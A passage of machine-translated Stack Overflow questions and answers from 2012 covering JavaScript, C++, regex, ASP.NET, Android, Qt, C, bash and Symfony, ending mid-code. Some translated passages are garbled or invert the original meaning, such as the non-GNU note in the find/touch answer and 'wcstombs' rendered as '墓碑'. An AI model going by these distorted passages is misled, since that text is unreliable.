> 时间：2012-09-17T13:50:50.150
> 
> 标签：javascript, typeerror, isnull

在尝试通过 JavaScript 从导入的文本中删除有问题的字符时，我收到 TypeError: Name is "null" 在这一行：

```
for ( var i = 0; i < name.length; i++) { 
```

这是代码的相关部分 -

```
fixNameToMiniCharset : function (name) {
    if(typeof name == 'undefined') {
        com.synckolab.global.consoleService.logStringMessage("undefined string " + new Error("s").stack);
    }
    var ret = "";
    // avoid double placeholders 
    var placeHolder = false;
    for ( var i = 0; i < name.length; i++) {
        switch (name.charAt(i)) {
        // character replaces... better this way
        case '\u00e4':
        case '\u00e1':
        case '\u00e0':
        case '\u00e2':
        case '\u00e3':
        case '\u00e5':
        case '\u00e6':
            placeHolder = false;
            ret += 'a';
            break;
        case '\u00c4':
        case '\u00c1':
        case '\u00c0':
        case '\u00c2':
        case '\u00c3':
        case '\u00c5':
        case '\u00c6':
            placeHolder = false;
            ret += 'A';
            break;
        case '\u00f6':
        case '\u00f3':
        case '\u00f2':
        case '\u00f4':
        case '\u00f5':
        case '\u00f8':
            placeHolder = false;
            ret += 'o';
            break;
        case '\u00d6':
        case '\u00d3':
        case '\u00d2':
        case '\u00d4':
        case '\u00d5':
        case '\u00D6':
            placeHolder = false;
            ret += 'O';
            break;
        case '\u00fc':
        case '\u00fa':
        case '\u00f9':
        case '\u00fb':
        case '\u0169':
        case '\u0171':
            placeHolder = false;
            ret += 'u';
            break;
        case '\u00dc':
        case '\u00da':
        case '\u00d9':
        case '\u00db':
        case '\u0168':
            placeHolder = false;
            ret += 'U';
            break;
        case '\u00c8':
        case '\u00c9':
        case '\u00ca':
        case '\u00cb':
            placeHolder = false;
            ret += 'E';
            break;
        case '\u00e8':
        case '\u00e9':
        case '\u00ea':
        case '\u00eb':
            placeHolder = false;
            ret += 'e';
            break;
        case '\u00ec':
        case '\u00ed':
        case '\u00ee':
        case '\u00ef':
            placeHolder = false;
            ret += 'i';
            break;
        case '\u00dd':
        case '\u00a5':
            placeHolder = false;
            ret += 'Y';
            break;
        case '\u00c7':
            placeHolder = false;
            ret += 'C';
            break;
        case '\u00e7':
            placeHolder = false;
            ret += 'c';
            break;
        case '\u00fd':
        case '\u00ff':
            placeHolder = false;
            ret += 'y';
            break;
        case '\u00df':
            placeHolder = false;
            ret += 's';
            break;
        case '\u00f1':
            placeHolder = false;
            ret += 'n';
            break;
        case '\u00b2':
            placeHolder = false;
            ret += '2';
            break;
        case '\u00b3':
            placeHolder = false;
            ret += '3';
            break;

        // chars which are no problem just stay
        case '_':
            // make sure to print it only once
            if(!placeHolder) {
                ret += name.charAt(i);
                placeHolder = true;
            }
            break;

        default:
            var c = name.charAt(i);
            if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')) {
                placeHolder = false;
                ret += c;
            } else {
                if (!placeHolder) {
                    ret += '_';
                    placeHolder = true;
                }
            }
        }
    }
    return ret; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T13:59:53.560

乍一看，问题很简单：您正在检查参数的类型：如果未定义，您的函数将无法运行。但是在 JS 中，null 不是 undefined，undefined 也不是 null。

```
console.log(typeof null);//object!
console.log(null == undefined);//true
console.log(null === undefined);//false! 
```

`if(typeof name == 'undefined')`因此，要么通过检查所有虚假值来替换您的 if ( )：

```
if(!name)
{
    //invalid argument: false, null, 0, '' and undefined
}
//valid args: true, '0', any number, other than 0, strings objects... 
```

或者，在你的情况下可能更可取：检查你是否有一个长度属性可以玩

```
if (!name || !name.length)
{
    //invalid
} 
```

*或*检查输入是否为字符串：

```
if (typeof name === 'string') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:57:21.917

更改这些行：

```
if(typeof name == 'undefined') {
    com.synckolab.global.consoleService.logStringMessage("undefined string " + new Error("s").stack);
} 
```

到以下：

```
if(!name) {
    com.synckolab.global.consoleService.logStringMessage("undefined string " + new Error("s").stack);
    return;
} 
```

这将检查空的未定义值和其他虚假值，这将阻止您的函数工作。

# c++ - 如何为需要所有 const 值的方法提供参数？

> ID：12460704
> 
> 赞同：0
> 
> 时间：2012-09-17T13:51:00.263
> 
> 标签：c++, constants

[http://www.chai3d.org/doc/classc_camera.html#6b5bbcc535b601c19e10be288dfc65f7](http://www.chai3d.org/doc/classc_camera.html#6b5bbcc535b601c19e10be288dfc65f7)

为了

```
bool cCamera::set   (   const cVector3d &   a_localPosition,
                        const cVector3d &   a_localLookAt,
                        const cVector3d &   a_localUp    
) 
```

此调用返回 true 即成功

```
camera->set( cVector3d (1, 0.0, 3),    // camera position (eye)
        cVector3d (0.0, 0.0, 0.0),    // lookat position (target)
        cVector3d (-1.0, 0.0, 0.0));   // direction of the "up" vector);
    } 
```

我没有收到任何错误，但是此调用返回 false，即无法设置相机新位置，为什么？

```
 camera->set( cVector3d(toolPos.x,toolPos.y,toolPos.z),
              cVector3d(toolPos.x,toolPos.y,toolPos.z),
              cVector3d (1.0, 0.0, 0.0)); 
```

当我使用断点检查时，工具是一个具有有效值的 cVector3d 变量....cVector3d 的定义也是

```
cVector3d (const double a_x, const double a_y, const double a_z) 
```

构造函数通过传递一个双精度来初始化向量。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:19:29.720

那么您的第一个向量（相机位置）和您的第二个向量（观察位置）具有相同的值。`eye`设置新位置的算法无法确定相机朝向的方向，因为从到没有方向`lookAt`。只需`lookat position`从`eye`您想要查看的方向移动。

# facebook - 按标签过滤对照片的 OpenGraph 请求

> ID：12460705
> 
> 赞同：0
> 
> 时间：2012-09-17T13:51:08.000
> 
> 标签：facebook, facebook-opengraph

给定以下 OpenGraph 请求：/me/photos?fields=name_tags,tags.fields(id),id&type=tagged

（返回我标记的所有图像）

我如何告诉 FB 只返回标记了另一个朋友的图像？

# c++ - 将 LPWSTR 转换为字符串

> ID：12460712
> 
> 赞同：22
> 
> 时间：2012-09-17T13:51:29.080
> 
> 标签：c++, winapi, mingw

函数`CommandLineToArgvW`给我`LPWSTR`类型的命令行参数。我需要这些论点`string`。有人请告诉我如何转换`LPWSTR`为`string`？
我正在使用mingw。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-09-17T13:54:18.683

```
std::string MyString = CW2A (L"LPWSTR STRING"); 
```

你需要`atlstr.h`包括[`CW2A`](https://msdn.microsoft.com/en-us/library/87zae4a3.aspx?f=255&MSPPError=-2147217396)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-09-17T13:56:02.167

尝试使用以下 API 函数：

1.  [WideCharToMultiByte](http://msdn.microsoft.com/en-us/library/windows/desktop/dd374130%28v=vs.85%29.aspx)

2.  [墓碑](http://msdn.microsoft.com/en-us/library/5d7tc9zw%28v=vs.71%29.aspx)

以及两种方法[WideCharToMultiByte() 与 wcstombs()的比较](https://stackoverflow.com/questions/5620831/widechartomultibyte-vs-wcstombs)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-11-22T05:51:49.540

假设你的 LPWSTR 变量是 myVarL：

```
wstring ws( myVarL ); 
string myVarS = string( ws.begin(), ws.end() ); 
```

应该做你想要的

# regex - 在正则表达式中，禁用双破折号

> ID：12460719
> 
> 赞同：0
> 
> 时间：2012-09-17T13:51:47.530
> 
> 标签：regex

我有这个正则表达式：

```
^(?!^(PRN|AUX|CLOCK\$|NUL|CON|COM\d|LPT\d|\..*)(\..+)?$)([a-zA-Z]|)(\:|)[^\x00-\x1f\'\?\-\*\:\"\;\|\/]+$ 
```

这不允许使用单个破折号的文件名。但我不想只允许双破折号（文件名/文件夹中的任何地方），单破折号应该没问题。

感谢您提供任何信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:03:04.740

将末尾的更改为`[^\x00-\x1f\'\?\-\*\:\"\;\|\/]+`允许此字符类（可选地后跟破折号，后跟此字符类）重复任意次数的表达式。如果您愿意，还可以添加可选的前导和尾随破折号。（我在这里添加它们是因为它比解释更容易:-)

```
^(?!^(PRN|AUX|CLOCK\$|NUL|CON|COM\d|LPT\d|\..*)(\..+)?$)([a-zA-Z]|)(\:|)-?[^\x00-\x1f\'\?\-\*\:\"\;\|\/]+(-[^\x00-\x1f\'\?\-\*\:\"\;\|\/]+)*-?$ 
```

我至少需要一个非破折号字符；如果您想允许单个破折号，则第一个非可选组可以包含它，但是尾随上下文必须看起来不同。

我会使用非捕获组，但你没有告诉你正在使用哪种正则表达式风格，所以也许你没有它们。

# jquery - 无法使用详细信息视图在 jquery 对话框中插入数据

> ID：12460723
> 
> 赞同：0
> 
> 时间：2012-09-17T13:51:59.470
> 
> 标签：jquery, asp.net, .net, jquery-ui, web

[如果我将数据放在jquery 对话框](http://jqueryui.com/demos/dialog/#default)中，我似乎无法使用我的 asp detailsview 将数据插入到我的数据库中。但是，只要我将它直接放在页面内，它就可以正常工作。

当我将它放在对话框中时，我仍然可以填写信息，但是当我提交 SQL 服务器时抱怨使用 NULL 值，如下所示：

```
 Cannot insert the value NULL into column 'Alias', table 'GSSNetDB.dbo.GSSNet_EndUsers'; column does not allow nulls 
```

因此，由于某种原因，似乎回发功能无法从对话框内的 html 表单中读取信息。

我使用这个创建对话框：

```
<div id="dialogEndUser" title="Create new user">
    <asp:DetailsView 
        ID="DetailsView_EndUsers"
        runat="server"
        Caption="Enter new user details"
        Visible="True"

        AutoGenerateInsertButton="True"
        AutoGenerateRows="False"

        DataKeyNames="Alias"
        DataSourceID="EndUserSource"
        DefaultMode="Insert">
        <Fields>
          <asp:BoundField DataField="Alias" HeaderText="Alias" ReadOnly="True" SortExpression="Alias" />
          <asp:BoundField DataField="Address" HeaderText="Address*" SortExpression="Address" />
          <asp:BoundField DataField="Name" HeaderText="Name*" SortExpression="Name" />
          <asp:BoundField DataField="Device_Key" HeaderText="Device Key" SortExpression="Device_Key" />
          <asp:BoundField DataField="Phone_Number" HeaderText="Phone_Number" SortExpression="Phone_Number" />
          <asp:BoundField DataField="E_mail" HeaderText="E-mail" SortExpression="E_mail" />
          <asp:BoundField DataField="Description" HeaderText="Description" SortExpression="Description" />
        </Fields>
    </asp:DetailsView>
</div> 
```

实际弹出窗口使用：

```
$(function () {
  $("#dialogEndUser").dialog({
    height: 350,
    width: 300,
    position: "top",
    modal: false,
    autoOpen: false
  });
}); 
```

数据源如下所示：

```
<asp:SqlDataSource ID="EndUserSource" runat="server"
    ConnectionString="<%$ ConnectionStrings:GSSNetDB %>"   
    InsertCommand="INSERT INTO [Users] ([Alias], [Address], [Device_Key], [Name], [Phone_Number], [E_mail], [Description]) VALUES (@Alias, @Address, @Device_Key, @Name, @Phone_Number, @E_mail, @Description)">
  <InsertParameters>
    <asp:Parameter Name="Alias" Type="String" />
    <asp:Parameter Name="Address" Type="String" />
    <asp:Parameter Name="Device_Key" Type="String" />
    <asp:Parameter Name="Name" Type="String" />
    <asp:Parameter Name="Phone_Number" Type="String" />
    <asp:Parameter Name="E_mail" Type="String" />
    <asp:Parameter Name="Description" Type="String" />
  </InsertParameters>
</asp:SqlDataSource> 
```

如果有人可以帮助我或提供有关如何解决问题的任何指示，我将不胜感激。如果有人有推荐，也许可以尝试使用不同的对话系统？

谢谢你的时间！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:09:51.350

我认为，尽管您确实设置了参数，但`dataKeyName="Alias"`您的 insertCommand 参数没有任何值，因为您将此 boundField 设置为`ReadOnly="True"`.

```
InsertCommand="INSERT INTO [Users] (
           [Alias], [Address], [Device_Key], [Name], [Phone_Number], [E_mail], [Description]) 
    VALUES (@Alias, @Address, @Device_Key, @Name, @Phone_Number, @E_mail, @Description)" 
```

您能否验证**@Alias** *在插入时是否有值？*（例如：使用 SqlDataSource 和 debug/watch 的插入事件`e.Command.Parameters["@Alias"]` 。

另一方面，您写道，*如果您将 detailsView 放在 jQuery 对话框之外，它***工作正常** ，这让我想知道？！*我错过了什么吗？**欢迎任何意见/反馈！*

 *** * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-07T16:21:00.030

问题是 jQuery 在 FORM 元素之外创建了它的浮动 DIV 元素，并将 DetailView 表移动到这些 div 中；因此这些值不会包含在回发中。您可以通过在表单外部的页面上创建一个文本框来测试这一点，`input(runat=server)`并观察它在回发后不会返回值。当对话框可见时，您可以通过使用浏览器的开发人员工具检查页面来查看表单元素之外的 div 元素。

我还不确定我将如何解决这个问题。我的第一个想法是在对话框关闭之前使用 JavaScript 从 DetailsView 表中的输入更新表单中的隐藏字段；尽管这会消除`DetailsView`控件的有用性。它可能比这更简单，因为我希望有一种简单的方法来告诉 jQuery 在表单元素中构建它的对话框 div。如果我发现任何东西，我会稍微研究一下 jQuery 修复并再次发布。**

# android - AutoCompleteTextView 1\. 添加按钮 2\. 创建联系人适配器 3\. AutoCompleteTextView 中的空格

> ID：12460725
> 
> 赞同：0
> 
> 时间：2012-09-17T13:52:09.323
> 
> 标签：android, contacts, autocompletetextview

我正在尝试制作一个像 Android 4.1 中内置的消息应用程序一样的撰写新消息屏幕

1.  我注意到当一个人选择一个联系人时，在 AutoCompleteTextView 中插入了一个按钮之类的东西。这怎么可能？请帮忙，因为我什至不知道给它一个起始代码。PS：我很想在创建新帖子时在 StackOverflow 的“标签”条目中实现类似的东西。IE 单词（匹配的联系人）被按钮替换，右边缘有一个小 X 以删除它们！:-)

2.  您如何创建加载速度如此之快的适配器？一个想法是缓存所有联系人的列表（姓名、电话号码、电话号码类型）。还有其他想法吗？（例如，如果我们可以使用 2 个字符的初始搜索字符串查询内容提供程序，这将大大减少自动完成结果的数量，从而减少加载适配器所需的时间。但是当然，这需要设置键入每个字符时自动完成文本视图的适配器。我的疑问是，是否可以查询 ContactsContract 以获取以几个给定字母开头的搜索结果，而不仅仅是使用光标从一开始就扫描整个数据库？）

3.  autocompletetextview 不识别空格，并且不给出任何结果。我已经读过[这个](https://groups.google.com/forum/?fromgroups#!topic/android-developers/OrsN2xRpDmA) 但无法实现它，有没有人有任何工作代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-22T23:21:45.190

I built [TokenAutoComplete](https://github.com/splitwise/TokenAutoComplete) to solve this issue as there did not appear to be a simple way to do this. Here's a basic example solving points 1 and 3:

```
public class ContactsCompletionView extends TokenCompleteTextView {
    public ContactsCompletionView(Context context, AttributeSet attrs) {
        super(context, attrs);
    }

    @Override
    protected View getViewForObject(Object object) {
        Person p = (Person)object;

        LayoutInflater l = (LayoutInflater)getContext().getSystemService(Activity.LAYOUT_INFLATER_SERVICE);
        LinearLayout view = (LinearLayout)l.inflate(R.layout.contact_token, (ViewGroup)ContactsCompletionView.this.getParent(), false);
        ((TextView)view.findViewById(R.id.name)).setText(p.getName());

        return view;
    }

    @Override
    protected Object defaultObject(String completionText) {
        //Stupid simple example of guessing if we have an email or not
        int index = completionText.indexOf('@');
        if (index == -1) {
            return new Person(completionText, completionText.replace(" ", "") + "@example.com");
        } else {
            return new Person(completionText.substring(0, index), completionText);
        }
    }
} 
```

Layout code for contact_token (you'll need to find your own x drawable)

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_height="wrap_content"
    android:layout_width="wrap_content"
    android:background="@drawable/token_background">
    <TextView android:id="@+id/name"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:textColor="@android:color/white"
        android:textSize="14sp"
        android:text="Test Me"
        android:padding="2dp" />

    <ImageView
        android:layout_height="10dp"
        android:layout_width="10dp"
        android:src="@drawable/x"
        android:layout_gravity="center_vertical"
        android:layout_marginLeft="3dp"
        android:layout_marginRight="5dp" />
</LinearLayout> 
```

Token backgound drawable

```
<shape xmlns:android="http://schemas.android.com/apk/res/android" >
    <solid android:color="#ffafafaf" />
    <corners
        android:topLeftRadius="5dp"
        android:bottomLeftRadius="5dp"
        android:topRightRadius="5dp"
        android:bottomRightRadius="5dp" />
</shape> 
```

Person object code

```
public class Person implements Serializable {
    private String name;
    private String email;

    public Person(String n, String e) { name = n; email = e; }

    public String getName() { return name; }
    public String getEmail() { return email; }

    @Override
    public String toString() { return name; }
} 
```

Sample activity

```
public class TokenActivity extends Activity {
    ContactsCompletionView completionView;
    Person[] people;
    ArrayAdapter<Person> adapter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        people = new Person[]{
                new Person("Marshall Weir", "marshall@example.com"),
                new Person("Margaret Smith", "margaret@example.com"),
                new Person("Max Jordan", "max@example.com"),
                new Person("Meg Peterson", "meg@example.com"),
                new Person("Amanda Johnson", "amanda@example.com"),
                new Person("Terry Anderson", "terry@example.com")
        };

        adapter = new ArrayAdapter<Person>(this, android.R.layout.simple_list_item_1, people);

        completionView = (ContactsCompletionView)findViewById(R.id.searchView);
        completionView.setAdapter(adapter);
        completionView.setTokenClickStyle(TokenCompleteTextView.TokenClickStyle.Delete);
    }
} 
```

Layout code

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent">

    <com.tokenautocomplete.ContactsCompletionView
        android:id="@+id/searchView"
        android:layout_width="match_parent"
        android:layout_height="wrap_content" />

</RelativeLayout> 
```

Here's what it looks like:

![enter image description here](../Images/4f70882d18c069a4918ec3d77b2eb28a.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:00:19.777

[您可以在 Android GitHub 上](https://github.com/android/platform_packages_apps_mms)免费查看内置消息应用程序的源代码。您需要的只是耐心阅读和理解代码。我提醒您，**并非所有代码都在公共 SDK 中**，因此使用时要小心。

[1、带有联系人标签RecipientEditTextView](http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/4.0.1_r1/com/android/ex/chips/RecipientEditTextView.java)的 MultiAutoComplete 。[RecipientsEditor](https://github.com/android/platform_packages_apps_mms/blob/master/src/com/android/mms/ui/RecipientsEditor.java)是类扩展，`RecipientEditTextView`他们在应用程序更新中使用它：这是撰写屏幕的[布局](https://github.com/android/platform_packages_apps_mms/blob/master/res/layout/compose_message_activity.xml#L37)。第 37 行是您想要的 autocompletetextview。下面是它的布局。

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:orientation="horizontal">

<com.android.mms.ui.RecipientsEditor
    android:id="@+id/recipients_editor"
    android:hint="@string/to_hint"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:inputType="textFilter"
    android:layout_weight="1"
    android:textColor="#000000"
/>

<ImageButton android:id="@+id/recipients_picker"
    android:src="@drawable/ic_launcher_contacts"
    android:layout_marginLeft="5dip"
    android:layout_width="50dip"
    android:layout_height="fill_parent"
    android:layout_weight="0"
    android:visibility="gone"
/> 
```

# iphone - Cocos2D/Kobold2D 中带有 CCSprites 的 CCArray

> ID：12460726
> 
> 赞同：1
> 
> 时间：2012-09-17T13:52:10.017
> 
> 标签：iphone, objective-c, ios, cocos2d-iphone, kobold2d

我正在使用 ARC 开发 Cocos2D/Kobold2D 游戏。我想将 CCSprite 引用存储在 CCArray 中。所有的 CCSprite 对象都作为子节点添加到父 CCNode。用 [NSValue valueWithNonretainedObject:..] 包装 CCSprite 对象以用于弱引用是个好主意吗？在所有示例中，我发现 CCSprites 都存储在 CCArrays 中......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T08:43:12.113

真的没有必要使用 NSValue。

如果您将对象添加到 NSArray 或 CCArray 或任何集合，它们将被保留。您有责任确保在适当的时间分别删除对象和发布的集合。

在许多情况下，您实际上不需要单独存储节点引用。您有 children 数组，只需对其进行迭代并选择您需要使用的节点，例如通过标记它们或使用 userObject 属性。

# bash - 递归触摸以修复计算机之间的同步

> ID：12460728
> 
> 赞同：9
> 
> 时间：2012-09-17T13:52:13.117
> 
> 标签：bash, command-line, sync, dropbox

由于我的错误，我正在寻找一种从命令行访问目录（和子目录）中每个文件的方法，我的一个同步存储库在我的开发机器上有点不同步。

我现在已经通过一些不愉快的巫术设法让​​它在一台机器上恢复到干净的状态，在我进行下一次同步之前，我想优先考虑这台机器上的所有时间。

有没有一种简单的方法可以触摸所有文件？

还是我最好手动同步目录？

（我正在使用 Dropbox 进行同步以供参考）

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-17T14:23:51.420

您可以使用`find`with`xargs`来触摸当前或指定目录或以下目录中的每个文件：

```
find . -print0 | xargs -0 touch 
```

对于当前目录。对于指定目录：

```
find /path/to/dir -print0 | xargs -0 touch 
```

通过使分隔符为 NULL来使命令对带有空格的文件名具有鲁棒性的选项`-print0`。`find``-0``xargs`

编辑：

正如 Jeremy J Starchar 在评论中所说，上述内容仅适用于您`find`并且`xargs`是 GNU 工具链的一部分。如果您在使用我们的 GNU 工具的系统上，您可以使用：

```
find . -exec touch {} \; 
```

由**dcgregorya**编辑：

必须针对非常大的数据集执行此操作，我发现此命令（快得多）。

```
find ./ -type d -print0 | xargs -I{} -0 bash -c "touch {}/*" 
```

将查找限制为查找文件夹，然后对文件夹 /* 执行触摸。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-18T09:49:43.607

所以这是我接触所有文件的直接问题的解决方案，它是否适用于 Dropbox 将不得不被看到。

在相关目录的根目录中

```
find . -print -exec touch {} \; 
```

（打印无关紧要，但对反馈很有帮助）

# outlook - 使用 CRM Dynamics 2011 为从 Outlook 触发的查找设置默认实体

> ID：12460735
> 
> 赞同：0
> 
> 时间：2012-09-17T13:52:39.167
> 
> 标签：outlook, customization, dynamics-crm-2011, lookup

我正在尝试在由多实体“设置相关”查找字段触发的表单中设置默认查找实体。

实体表单中的[javascript 调整](http://crmentropy.blogspot.com/2010/07/default-entity-for-multi-entity-lookups.html)集对我来说是不够的，因为大多数用户都使用 CRM 的 Outlook 集成。右键单击任何 Outlook 电子邮件都有一个“设置相关”选项，这将打开 CRM 查找表单。

[（请参阅 Outlook 集成）](http://i45.tinypic.com/33wqh69.png)

到目前为止，我已经使用 javascript 调整完成了大部分自定义，但我找不到任何可以直接使用的“查找”表单。还有其他方法可以自定义这些表格吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T15:57:03.113

不幸的是，这是 Outlook 集成的一部分，无法通过个人选项（或任何其他已知方式）进行自定义。此外，没有任何 JavaScript 可用于从您的收件箱进行自定义。

我不想这么说，但我知道的唯一方法是编写自己的 Outlook 插件来执行此操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-24T20:56:28.730

这是不支持我的微软但是..

看看 C:\Program Files\Microsoft Dynamics CRM\CRMWeb_controls\lookup\lookupinfo.aspx

在 Windows_OnLoad 事件中放入以下 ​​JS 行。

document.getElementById("selObjects").value = "2"; // 将默认设置为 'Contact' document.getElementById("selObjects").onchange();

您可以在 dbo.EntityView 中找到您需要的值。

# c++ - 使用 QPainter 绘制可扩展的 QIcon

> ID：12460737
> 
> 赞同：7
> 
> 时间：2012-09-17T13:52:44.923
> 
> 标签：c++, qt, icons, scalable

我想设计一个新的 QIcon 并希望它看起来像一个带有圆角矩形的固定文本

```
.-----.
| Phy |
`-----´ 
```

在最终应用了缩放转换的 QPainter 上绘制时，该图标应该在没有“像素块”效果的情况下进行缩放（例如，当我绘制到作为 QGraphicsView 的一部分的小部件中并在其场景上应用了缩放时）。

因此，我很难知道如何绘制我的 QIcon。如果我按照以下方式进行，我将绘制一个始终具有固定数量像素的 QPixmap，因此当比例足够大时不可避免地会引入像素块效果

```
 void MyWidget::drawIcon(QPainter *painter, QPoint pos) {
     QPixmap pixmap = icon.pixmap(QSize(22, 22),
                                    isEnabled() ? QIcon::Normal
                                                : QIcon::Disabled,
                                    isChecked() ? QIcon::On
                                                : QIcon::Off);
     painter->drawPixmap(pos, pixmap);
 } 
```

我正在寻找的是一种类似于 QFont 的`drawText`工作方式。无论我的比例有多大，当我绘制字体时，它总是看起来很清晰，我无法检测到单个像素。

我想我可以告诉我将`QPainter`我的图标绘制成一个给定的像素矩形，并在让我将项目渲染成一个可能更大的矩形或像素图之前`QPainter`转换矩形*本身。*`QIconEngine::paint`但我看不出我怎么能做这样的事情。

我只是愚蠢而没有看到明显的解决方案吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-17T16:08:11.267

我确实被彻底抛弃了。我可以使用`QIcon::paint`并将其传递给矩形。它将正确地将请求委托给图标引擎。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:50:10.543

我通过将我的图标/图像创建为 SVG 文件并使用`QSvgRenderer`将它们绘制到`QPainter`. 所需的类在[SVG 模块](https://qt-project.org/doc/qt-4.8/qtsvg.html)中。

# c - 如何在 Windows 上的 C 中将千位分隔符添加到双精度数？

> ID：12460738
> 
> 赞同：6
> 
> 时间：2012-09-17T13:52:44.737
> 
> 标签：c, windows, double, separator

我使用 MPFR 库对大数进行计算，但也返回小数点后 8 位的双精度数。

我将 mpfr_sprintf 数字转换为 char 数组，因此不会丢失任何精度或任何内容。一切都很好，除了我在文档中没有找到任何千位分隔符选项（或者我错过了它）。

给定一个诸如*20043.95381376*之类的数字，我想将其表示为*20,043.95381376*以提高可读性。

或数字*164992818.48075795*为*164,992,818.48075795*

我读到了一个应该添加到 printf/sprintf 的撇号，但这似乎是 UNIX/POSIX 的事情，而且我是 Windows 用户。

由于在内部我将数字打印为字符串，我想我可以做的是编写一个自定义实现，它会根据数字自动添加逗号（> 1000> 10000> 100000等），但后来我意识到像strncpy这样的功能或 strcpy 将实质上替换，而不是将逗号添加到所需位置。这就是我如何回到如何做到这一点的问题。

我该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T15:27:34.080

您需要您的实现将双精度值转换为字符串并检查该字符串的每个字符，然后将其与分隔符一起复制到输出字符串。

像这样的东西：

```
#include <stdio.h>
#include <string.h>

int thousandsep(double in, char* out_str, size_t out_len, unsigned int precision) {
    char in_str[128], int_str[128], format[32];
    size_t dlen, mod, i, j;
    int c;

    snprintf(format, sizeof format, "%%.%df", precision);
    snprintf(in_str, sizeof in_str, format, in);
    snprintf(int_str, sizeof int_str, "%d", (int)in);

    dlen = strlen(in_str);
    mod = strlen(int_str) % 3;
    c = (mod == 0) ? 3 : mod;

    for (i=0, j=0; i<dlen; i++, j++, c--) {
        if (j >= out_len - 1) {
            /* out_str is too small */
            return -1;
        }

        if (in_str[i] == '.') {
            c = -1;
        } else if (c == 0) {
            out_str[j++] = ',';
            c = 3;
        }

        out_str[j] = in_str[i];
    }
    out_str[j] = '\0';

    return 0;
} 
```

然后像这样使用它：

```
char out_str[64];

if (thousandsep(20043.95381376, out_str, sizeof out_str, 8) == 0)
    printf("%s\n", out_str);       /* 20,043.95381376 */

if (thousandsep(164992818.48075795, out_str, sizeof out_str, 8) == 0)
    printf("%s\n", out_str);       /* 164,992,818.48075795 */

if (thousandsep(1234567.0, out_str, sizeof out_str, 0) == 0)
    printf("%s\n", out_str);       /* 1,234,567 */ 
```

*注意：*我假设如果您使用的是 Windows，您可能正在使用 MSVC，因此该解决方案应该适用于 C89 编译器。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T15:48:26.620

[`GetNumberFormatEx`](http://msdn.microsoft.com/en-us/library/windows/desktop/dd318113(v=vs.85).aspx)将采用数字的纯字符串版本并使用分组分隔符、适当的小数点等对其进行格式化。`LOCALE_NAME_USER_DEFAULT`作为语言环境传递，它将采用用户喜欢的格式。

如果您需要覆盖其中一项设置（如精度），您可以[使用默认值填充 NUMBERFMT 结构，](https://stackoverflow.com/questions/7214669/easy-way-to-get-numberfmt-populated-with-defaults)然后更改您需要控制的字段。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T15:12:59.940

似乎没有可以使用的格式化指令。

这是获取包含浮点数的字符串并将逗号插入适当位置的一种快速而肮脏的方法。

这使用了几个临时缓冲区。千位分隔符符号将取决于区域设置，小数点符号也是如此。然而，对于这个例子，逗号是硬编码的。

这基本上只是采用浮点数的字符串表示，然后逐步将数字复制到另一个缓冲区并在适当的位置插入逗号。

你也可以看看用更少的缓冲区来做这件事，就像我说的那样，这既快又脏，而且效率不高。

```
{
    double dFloat = 123456789012.567890;
    char xBuff[128];
    sprintf (xBuff, "%f", dFloat);

    char xBuff2[128];
    int iLen = strlen(xBuff);
    int iPoint = iLen;
    for (iLen--; iLen >= 0; iLen--) {
        if (xBuff[iLen] == '.' || xBuff[iLen] == ',') {
            // found the decimal point.  depends on locale.
            iPoint = iLen;
            break;
        }
    }
    strcpy (xBuff2, xBuff + iPoint);   // save the decimal portion

    char xBuff3[128], xBuff4[128];
    xBuff3[127] = 0;    // set an end of string
    int  iCount, jLen;
    for (iCount = 1, jLen = 126, iLen--; iLen >= 0; jLen--, iLen--) {
        if ((iCount % 4) == 0) {
            xBuff3[jLen] = ',';
            jLen--;
            iCount = 1;
        }
        xBuff3[jLen] = xBuff[iLen];
        iCount++;
    }
    strcpy (xBuff4, xBuff3 + jLen + 1);
    strcat (xBuff4, xBuff2);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-08-25T15:02:55.303

```
#include <stdio.h>
#include <locale.h>

int main(void)
{
    setlocale(LC_NUMERIC, "");
    printf("%'.8lf\n", 164992818.48075795);
    return 0;
} 
```

# symfony - 在 Symfony 2 中导入 CSV

> ID：12460740
> 
> 赞同：11
> 
> 时间：2012-09-17T13:52:49.340
> 
> 标签：symfony, csv, import

我正在尝试在 Symfony 2 中导入一个 .csv 文件。我已经创建了一个文件表单，现在我想将它保存在我的数据库中。

这是我的处理程序文件，我想在其中进行 .csv 处理并将其持久化：

```
public function process()
{
    if ($this->request->getMethod() == 'POST')
    {
        $this->form->bindRequest($this->request);

        $tableau = array();
        $i = 0;
        $c = 0;
        $num = 0;

